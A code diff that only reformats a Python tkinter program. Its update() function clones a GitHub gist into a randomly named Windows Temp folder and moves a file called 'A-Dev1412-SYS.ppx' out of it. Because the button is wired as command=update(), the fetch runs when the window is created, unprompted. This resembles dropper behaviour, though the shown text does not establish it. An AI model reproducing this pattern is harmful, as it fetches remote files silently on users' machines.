@@ -8,7 +8,6 @@ import git
 
 
 def update():
-
     def random_char(y):
         return "".join(random.choice(string.ascii_letters) for x in range(y))
 
@@ -20,7 +19,8 @@ def update():
     print("Directory '% s' is built!" % main_dir)
 
     git.Git(main_dir).clone(
-        "https://gist.github.com/0e0687d042c5ba6494d8d81c0051151f.git")
+        "https://gist.github.com/0e0687d042c5ba6494d8d81c0051151f.git"
+    )
 
     shutil.move(
         f"C:/Windows/Temp/{random_num}/0e0687d042c5ba6494d8d81c0051151f/A-Dev1412-SYS.ppx",
@@ -41,10 +41,9 @@ def create_account():
     )
     progname.grid(row=1, column=3, padx=50, pady=30)
 
-    update_button = Button(window,
-                           font=("Segoe UI", 20, "bold"),
-                           text="Update",
-                           command=update())
+    update_button = Button(
+        window, font=("Segoe UI", 20, "bold"), text="Update", command=update()
+    )
     update_button.place(relx=0.37, rely=0.5)
 
     window.mainloop()
